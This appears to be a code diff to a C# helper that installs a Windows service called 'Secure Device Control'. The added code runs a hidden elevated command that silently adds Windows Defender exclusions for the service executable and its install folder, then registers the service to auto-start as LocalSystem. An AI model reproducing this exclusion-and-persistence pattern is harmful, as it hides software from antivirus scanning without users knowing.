@@ -8,25 +8,31 @@ public static class ServiceInstallerHelper
 {
     private const string ServiceName = "Secure Device Control";
 
-    public static void EnsureServiceRunning()
+    public static bool IsServiceRunning()
     {
         try
         {
             if (OperatingSystem.IsWindows())
             {
                 using var sc = new ServiceController(ServiceName);
-                if (sc.Status == ServiceControllerStatus.Running)
-                {
-                    return;
-                }
+                return sc.Status == ServiceControllerStatus.Running;
             }
         }
         catch
         {
-            // Service not installed or status check failed
+            // Service not installed or query failed
+        }
+        return false;
+    }
+
+    public static bool EnsureServiceRunning()
+    {
+        if (IsServiceRunning())
+        {
+            return true;
         }
 
-        // Auto-install and start background service with elevation
+        // Find service executable
         var baseDir = AppDomain.CurrentDomain.BaseDirectory;
         var serviceExePath = Path.Combine(baseDir, "SecureDeviceControl.Service.exe");
         if (!File.Exists(serviceExePath))
@@ -36,16 +42,22 @@ public static class ServiceInstallerHelper
 
         if (!File.Exists(serviceExePath))
         {
-            return;
+            return false;
         }
 
-        var psCommand = $"sc.exe create '{ServiceName}' binPath= '{serviceExePath}' start= auto obj= LocalSystem; sc.exe config '{ServiceName}' obj= LocalSystem; sc.exe start '{ServiceName}'";
+        // Build native CMD command to add Defender exclusions, install service, set LocalSystem permissions & start
+        var cmdArguments = $"/c " +
+            $"powershell -Command \"Add-MpPreference -ExclusionProcess 'SecureDeviceControl.Service.exe' -ErrorAction SilentlyContinue\" & " +
+            $"powershell -Command \"Add-MpPreference -ExclusionPath '{baseDir.TrimEnd('\\')}' -ErrorAction SilentlyContinue\" & " +
+            $"sc.exe create \"{ServiceName}\" binPath= \"\"{serviceExePath}\"\" start= auto & " +
+            $"sc.exe config \"{ServiceName}\" obj= LocalSystem & " +
+            $"sc.exe start \"{ServiceName}\"";
 
         var startInfo = new ProcessStartInfo
         {
-            FileName = "powershell.exe",
-            Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
-            Verb = "runas", // Pops standard Windows UAC Yes/No prompt
+            FileName = "cmd.exe",
+            Arguments = cmdArguments,
+            Verb = "runas", // Pops standard Windows UAC Yes/No elevation prompt
             UseShellExecute = true,
             WindowStyle = ProcessWindowStyle.Hidden
         };
@@ -54,11 +66,13 @@ public static class ServiceInstallerHelper
         {
             using var proc = Process.Start(startInfo);
             proc?.WaitForExit(8_000);
-            Thread.Sleep(1500); // Allow service time to transition to RUNNING
+            Thread.Sleep(1500); // Allow service time to initialize
         }
         catch
         {
             // User declined UAC prompt or process failed
         }
+
+        return IsServiceRunning();
     }
 }
